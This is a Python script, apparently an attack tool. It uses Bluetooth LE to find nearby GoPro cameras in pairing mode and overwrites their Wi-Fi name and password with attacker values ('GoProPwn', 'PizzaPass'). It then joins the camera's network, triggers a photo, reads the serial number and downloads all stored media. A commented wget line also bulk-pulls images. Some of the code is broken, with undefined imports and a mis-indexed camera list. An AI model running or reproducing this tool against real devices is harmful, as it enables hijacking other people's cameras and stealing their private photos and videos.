#!/usr/bin/env python3

from bluetooth.ble import DiscoveryService
import gatt
import time
import urllib.request
import subprocess
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--newname', "-n", help='Changes Device Name', required=False, type=bool)
parser.add_argument('--newpassword', "-pw", help='Changes Device Password', required=False, type=bool)
parser.add_argument('--video', "-v", help='Download videos only', required=False, type=bool)
parser.add_argument('--photo', "-p", help='Download photos only', required=False, type=bool)
parser.add_argument('--all', "-a", help='Download all', required=False, type=bool)
parser.add_argument('--out', "-o", help='Output path', default="")

args = parser.parse_args()

print("GoPro Bluetooth Password Changer 1.0")
print("Put GoPro in Pairing mode!")

def connect(ssid, password):
        connection = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], stdout=subprocess.PIPE)
        print(connection.stdout.decode('utf-8'))

def discover_camera():
    cameras=[]
    service = DiscoveryService()
    devices = service.discover(2)
    for address, name in devices.items():
        if name.startswith("GoPro"):
            cameras.append([name,address])
    if len(cameras) == 0:
        print("No cameras detected.")
        exit()
    if len(cameras) == 1:
        return cameras[0][1]
    for i, index in enumerate(cameras):
        print("[{}] {} - {}".format(index, i[0], i[1]))
    return cameras[input("ENTER BT GoPro ADDR: ")][1]

mac_address=discover_camera()

manager = gatt.DeviceManager(adapter_name='hci0')
class AnyDevice(gatt.Device):
    def main():
        def trap_sigint(*args, **kwargs):
            logging.info("SIGNAL SIGINT")
        signal.signal(signal.SIGINT, trap_sigint)
        
    def run_gatt_devicemanager(self):
        dm =  gatt.DeviceManager()
        dm.run()
        t = Thread(target=run_gatt_devicemanager)
        t.start()
        t.join()
    def connect_succeeded(self):
        super().connect_succeeded()
        print("[%s] Connected" % (self.mac_address))

    def connect_failed(self, error):
        super().connect_failed(error)
        print("[%s] Connection failed: %s" % (self.mac_address, str(error)))

    def services_resolved(self):
        super().services_resolved()  
        wifi_info_service = next(
            s for s in self.services
            if s.uuid == "b5f90001-aa8d-11e3-9046-0002a5d5c51b")
        for i in wifi_info_service.characteristics:
            print(i.uuid)
            if i.uuid == "b5f90003-aa8d-11e3-9046-0002a5d5c51b":
                i.write_value(bytearray(b"newname"))
            if i.uuid == "b5f90002-aa8d-11e3-9046-0002a5d5c51b":
                i.write_value(bytearray(b"GoProPwn"))  
        pass
        
    def characteristic_write_value_succeeded(self, characteristic):
        characteristic.read_value()
        print("Reading characteristics")
    def characteristic_value_updated(self, characteristic, value):
        print("Checking updated characteristic value changes for uuid {}".format(characteristic.uuid))
        global wifissid
        global wifipass
        if value.decode("utf-8") == "GoProPwn" or value.decode("utf-8") == "PizzaPass":
                print("New values are updated")
        if characteristic.uuid == "b5f90003-aa8d-11e3-9046-0002a5d5c51b":
            if args.newname:
                try:
                    characteristic.write_value(bytearray(b"PizzaPass"))
                    print("#####")
                    wifipass = value.decode("utf-8")
                    #time.sleep(4)
                except KeyboardInterrupt:
                    print("Failed")
        if characteristic.uuid == "b5f90002-aa8d-11e3-9046-0002a5d5c51b":
                characteristic.write_value(bytearray(b"GoProPwn"))  
                print("####")
                wifissid = value.decode("utf-8")
                time.sleep(5)
        if wifipass != "" and wifissid != "":
                print("Connecting to camera with new SSID and Password")
                time.sleep(3)
                connect(wifissid, wifipass)
                #request below gives the camera WiFi access to the internet via wlan0
                urllib.request.urlopen("http://10.5.5.9/gp/gpControl/command/wireless/pair/complete?success=1&deviceName=Your+GP+My+GP", timeout=5).read()
                from goprocam import GoProCamera, constants
                gopro = GoProCamera.GoPro()
                medialist = gopro.listMedia(format=True, media_array=True)
                gopro.take_photo()
                print("We are connected to the GoPro's Wireless Network")
                print("WiFi SSID: %s\nWifi Password: %s" % (wifissid, wifipass))
                print("Camera Serial Number: ", gopro.infoCamera(constants.Camera.SerialNumber))
                if args.all:
                        try:
                            for media in medialist:
                                newpath = args.out + "/" + media[1]
                                gopro.downloadMedia(media[0], media[1], newpath)
                                time.sleep(20)
                        except KeyboardInterrupt:
                            print("press control-c again to quit")
        #wget -q --recursive -np -R -r http://10.5.5.9:8080/videos/DCIM/100GOPRO/GOPR{1..9000}.jpg
#if args.newname:
#       print("New WiFi SSID: %s" % (wifissid, wifipass))

#if args.newpassword:
#       print("New WiFi Password: %s" % wifipass)
device = AnyDevice(mac_address=mac_address, manager=manager)
device.connect()
manager.run()
manager.stop()
